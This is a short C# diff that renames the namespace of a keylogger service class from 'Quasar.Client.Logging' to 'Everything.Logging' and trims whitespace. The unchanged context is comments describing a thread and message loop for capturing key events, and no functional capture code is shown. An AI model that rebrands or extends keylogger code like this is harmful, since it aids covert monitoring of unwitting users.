@@ -2,7 +2,7 @@
 using System.Threading;
 using System.Windows.Forms;
 
-namespace Quasar.Client.Logging
+namespace Everything.Logging
 {
     /// <summary>
     /// Provides a service to run the keylogger.
@@ -13,12 +13,12 @@ namespace Quasar.Client.Logging
         /// The thread containing the executed keylogger and message loop.
         /// </summary>
         private readonly Thread _msgLoopThread;
-        
+
         /// <summary>
         /// The message loop which is needed to receive key events.
         /// </summary>
         private ApplicationContext _msgLoop;
-        
+
         /// <summary>
         /// Provides keylogging functionality.
         /// </summary>
